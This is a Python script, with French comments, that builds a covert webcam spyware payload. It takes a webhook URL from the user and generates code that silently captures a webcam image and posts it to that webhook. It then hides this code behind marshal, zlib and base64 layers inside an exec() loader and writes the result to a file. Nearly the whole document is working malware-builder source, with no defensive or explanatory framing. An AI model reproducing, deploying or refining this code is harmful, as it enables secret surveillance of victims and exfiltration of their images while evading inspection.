import os
import zlib
import base64
import marshal


def generate_webcam_code(webhook_url):
    code = f"""
import cv2
import requests
import io

def capture_and_send_image(webhook_url):
    # Capture une image depuis la webcam
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if not ret:
        print("Erreur lors de la capture de l'image")
        return
    cap.release()

    # Encoder l'image en mémoire sans la sauvegarder sur le disque
    _, img_encoded = cv2.imencode('.jpg', frame)
    img_bytes = img_encoded.tobytes()

    # Envoyer l'image vers le webhook directement depuis la mémoire
    files = {{'file': ('webcam_image.jpg', io.BytesIO(img_bytes), 'image/jpeg')}}
    response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print("Image envoyée avec succès!")
    else:
        print(f"Erreur lors de l'envoi de l'image: {{response.status_code}}")
        print(f"Détails de la réponse : {{response.text}}")

if __name__ == "__main__":
    webhook_url = "{webhook_url}"
    capture_and_send_image(webhook_url)
"""
    return code


def obfuscate_code(code):
    compiled_code = compile(code, '<string>', 'exec')
    serialized_code = marshal.dumps(compiled_code)
    compressed_code = zlib.compress(serialized_code)
    encoded_code = base64.b64encode(compressed_code).decode()

    obfuscated_code = f"""
import marshal
import zlib
import base64

exec(marshal.loads(zlib.decompress(base64.b64decode('{encoded_code}'))))
"""
    return obfuscated_code


def create_obfuscated_webcam_file(webhook_url):
 
    webcam_code = generate_webcam_code(webhook_url)
    
 
    obfuscated_code = obfuscate_code(webcam_code)

  
    obfuscated_file_path = "webcam_obfuscated.py"
    with open(obfuscated_file_path, 'w', encoding='utf-8') as f:
        f.write(obfuscated_code)

    print(f"Fichier obfusqué créé avec succès : {obfuscated_file_path}")
    return obfuscated_file_path


if __name__ == "__main__":
    webhook_url = input("Veuillez entrer l'URL du webhook : ")

   
    create_obfuscated_webcam_file(webhook_url)
